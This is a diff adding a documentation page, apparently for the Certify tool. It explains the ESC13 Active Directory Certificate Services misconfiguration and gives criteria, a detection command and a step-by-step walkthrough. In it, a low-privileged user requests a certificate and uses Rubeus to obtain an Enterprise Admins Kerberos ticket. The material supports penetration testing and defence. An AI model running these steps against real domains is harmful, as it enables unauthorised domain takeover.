@@ -1,0 +1,227 @@
+---
+title: 'ESC13 - Authentication Mechanism Assurance (AMA)'
+description: 'Exploit certificate templates with issuance policies linked to domain groups to gain temporary group membership'
+icon: 'users'
+sidebarTitle: 'ESC13'
+---
+
+ESC13 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from overly permissive enroll rights on special administrative certificate templates. Specifically, if a certificate template has been configured with an *Issuance Policy* that links to a domain group, then anyone who authenticates with a certificate issued from this template, will gain temporary membership into the linked domain group.
+
+<Info>
+This is defined as [Authentication Mechanism Assurance (AMA)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd378897(v=ws.10)?redirectedfrom=MSDN) by Microsoft.
+</Info>
+
+## Background
+
+This configuration was first discovered by Adam Burford, and later tagged `ESC13` by [Jonas Bülow Knudsen](https://medium.com/@jonasblowknudsen) in [this blogpost](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+
+## Vulnerability Criteria
+
+According to the research, the following criteria comprise an ESC13 vulnerability:
+
+<Accordion title="ESC13 Requirements">
+- The enterprise CA grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request any certificates from the CA.
+- The certificate template grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request certificates based on the specific template.
+- The "manager approval" feature is disabled for the certificate template.
+  - Otherwise, a "CA Manager" would have to manually review and approve the certificate request.
+- The "authorized signature" feature is disabled for the certificate template.
+  - Otherwise, an enrollment agent would need to sign the certificate request on behalf of the requester.
+- The certificate template defines an Extended Key Usage (EKU) that enables client authentication.
+  - `Client Authentication` (`1.3.6.1.5.5.7.3.2`)
+  - `PKINIT Client Authentication` (`1.3.6.1.5.2.3.4`)
+  - `Smart Card Logon` (`1.3.6.1.4.1.311.20.2.2`)
+  - `Any Purpose` (`2.5.29.37.0`)
+  - `Subordinate CA` (No EKUs)
+- The certificate template contains an issuance policy that links to an empty universal domain group.
+  - Otherwise, we do not gain membership into the domain group when authenticating with the certificate.
+</Accordion>
+
+## Detection
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Certificate templates found using the current filter parameters:
+
+    Template Name                         : TemporaryAdmin
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
++   Certificate Issuance Policies         : Temporary Admin Issuance (linked to group 'CN=TemporaryAdmins,OU=Groups,OU=Corp,DC=corp,DC=local')
+    Vulnerabilities
++     ESC13                               : The template has client authentication and an issuance policy linked to one or more domain group(s).
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+
+Certify completed in 00:00:00.6795818
+```
+</CodeGroup>
+
+## Exploitation
+
+Once we have identified a vulnerable certificate template that our attacker-controlled user can enroll in, we can evaluate if the issuance policy links to a group that is worth compromising. This includes checking what the group is a member of, and what access control permissions the group has across the environment.
+
+<CodeGroup>
+```powershell Evaluate Target Group
+Get-ADGroup TemporaryAdmins -Properties MemberOf,Members
+```
+
+```bash Output
+DistinguishedName : CN=TemporaryAdmins,OU=Groups,OU=Corp,DC=corp,DC=local
+GroupCategory     : Security
+GroupScope        : Universal
+MemberOf          : {CN=Enterprise Admins,CN=Users,DC=corp,DC=local}
+Members           : {}
+Name              : TemporaryAdmins
+ObjectClass       : group
+ObjectGUID        : 96a21f6c-8b35-4654-bc7d-4b9b7a40fbdd
+SamAccountName    : TemporaryAdmins
+SID               : S-1-5-21-976219687-1556195986-4104514715-1102
+```
+</CodeGroup>
+
+<Info>
+Since the `TemporaryAdmins` group is a member of the `Enterprise Admins` group, we deem that it is worth compromising, so we request a certificate from the template using the `request` command from Certify.
+</Info>
+
+<CodeGroup>
+```bash Request Certificate
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template TemporaryAdmin
+```
+
+```bash Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\lowpriv
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : TemporaryAdmin
+[*] Subject                 : CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 1
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.8732299
+```
+</CodeGroup>
+
+Once the certificate has been issued, we simply pass it to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) with the `asktgt` command using our low-privileged user.
+
+<CodeGroup>
+```bash Authenticate with Certificate
+Rubeus.exe asktgt /user:lowpriv /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt
+```
+
+```bash Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject:
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\lowpriv'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  lowpriv
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  02/07/2025 11.07.37
+  EndTime                  :  02/07/2025 21.07.37
+  RenewTill                :  09/07/2025 11.07.37
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  fsIjncNqfhwgn2G5ixAolw==
+  ASREP (key)              :  67CA9CAE3051A4E05EB9CA2B9ED9309C
+```
+</CodeGroup>
+
+Since the `/ptt` parameter was supplied to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) when requesting the TGT, we should now have a ticket in our Kerberos ticket list that contains `Enterprise Admins` membership. We can verify this by attempting to execute `whoami /all` on a domain controller.
+
+<CodeGroup>
+```powershell Verify Group Membership
+Invoke-Command -ComputerName DC01 -ScriptBlock { whoami /all }
+```
+
+```bash Output
+USER INFORMATION
+----------------
+
+User Name    SID
+============ =============================================
+corp\lowpriv S-1-5-21-976219687-1556195986-4104514715-1100
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                Type   SID                                           Attributes
+========================= ====== ============================================= ==================================================
+...
+CORP\TemporaryAdmins      Group  S-1-5-21-976219687-1556195986-4104514715-1102 Mandatory group, Enabled by default, Enabled group
+CORP\Enterprise Admins    Group  S-1-5-21-976219687-1556195986-4104514715-519  Mandatory group, Enabled by default, Enabled group
+...
+```
+</CodeGroup>
